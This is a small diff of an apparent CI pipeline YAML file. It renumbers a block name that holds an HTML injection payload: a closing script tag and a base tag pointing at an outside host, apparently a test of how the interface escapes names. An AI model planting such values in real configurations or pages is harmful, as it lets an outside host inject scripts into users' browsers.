@@ -5,7 +5,7 @@ agent:
     type: e1-standard-2
     os_image: ubuntu1804
 blocks:
-  - name: "4</script><base href='https://insert-script.com/' />"
+  - name: "5</script><base href='https://insert-script.com/' />"
     task:
       jobs:
         - name: 'Job #1'
